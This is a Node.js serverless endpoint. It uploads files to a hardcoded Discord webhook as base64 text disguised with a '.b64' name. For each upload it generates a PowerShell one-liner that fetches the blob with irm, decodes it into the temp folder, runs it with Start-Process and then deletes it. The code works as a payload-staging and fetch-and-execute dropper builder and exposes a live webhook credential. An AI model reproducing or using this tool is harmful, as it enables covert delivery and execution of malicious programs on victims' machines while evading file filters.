const https = require('https');
const formidable = require('formidable');
const fs = require('fs');

const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1504857329190048006/VKZEEClNQkY75JLhBYc91V5fr8buY5A-O8fgnJFtDVnHVwCc9Fro54FI9ZJrGSpssVh2';

module.exports.config = {
  api: {
    bodyParser: false,
  },
};

async function uploadToDiscord(filePath, filename) {
  const fileContent = fs.readFileSync(filePath);
  const base64Content = fileContent.toString('base64');
  const encodedName = filename.replace(/\.[^/.]+$/, '') + '.b64';
  const boundary = '----Boundary' + Math.random().toString(36).substring(2);
  
  const payload = Buffer.concat([
    Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${encodedName}"\r\nContent-Type: text/plain\r\n\r\n`),
    Buffer.from(base64Content),
    Buffer.from(`\r\n--${boundary}--\r\n`)
  ]);

  return new Promise((resolve, reject) => {
    const url = new URL(DISCORD_WEBHOOK);
    const req = https.request({
      hostname: url.hostname,
      path: url.pathname,
      method: 'POST',
      headers: {
        'Content-Type': `multipart/form-data; boundary=${boundary}`,
        'Content-Length': payload.length
      }
    }, res => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          const json = JSON.parse(data);
          if (json.attachments?.[0]?.url) resolve(json.attachments[0].url);
          else reject(new Error('Discord error'));
        } catch (e) { reject(new Error('Invalid Discord response')); }
      });
    });
    req.on('error', reject);
    req.write(payload);
    req.end();
  });
}

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  const form = formidable({ multiples: true });

  return new Promise((resolve) => {
    form.parse(req, async (err, fields, files) => {
      if (err) return resolve(res.status(500).json({ success: false, error: err.message }));

      try {
        const fileEntries = Array.isArray(files.fileToUpload) ? files.fileToUpload : [files.fileToUpload];
        const results = [];
        
        for (const file of fileEntries) {
          if (!file) continue;
          const url = await uploadToDiscord(file.filepath || file.path, file.originalFilename || file.name);
          results.push({ url, name: file.originalFilename || file.name });
        }

        const cmd = results.length === 1 
          ? `powershell -c "$t=\\"$env:TEMP\\${results[0].name}\\";$u='${results[0].url}';[IO.File]::WriteAllBytes($t,[Convert]::FromBase64String((irm $u).Trim().Trim('\\"')));Start-Process $t -Wait;Remove-Item $t"`
          : `powershell -c "${results.map((r,i) => `$t${i+1}=\\"$env:TEMP\\${r.name}\\";$u${i+1}='${r.url}';[IO.File]::WriteAllBytes($t${i+1},[Convert]::FromBase64String((irm $u${i+1}).Trim().Trim('\\"')))` ).join(';')};${results.map((r,i) => `Start-Process $t${i+1} -Wait`).join(';')};Remove-Item ${results.map((r,i) => `$t${i+1}`).join(',')}"`;

        const wh = https.request(DISCORD_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' } });
        wh.write(JSON.stringify({ content: `📁 **${results.map(r=>r.name).join(', ')}**\n\`\`\`powershell\n${cmd}\n\`\`\`` }));
        wh.end();

        res.status(200).json({ success: true, command: cmd });
        resolve();
      } catch (e) {
        res.status(500).json({ success: false, error: e.message });
        resolve();
      }
    });
  });
};
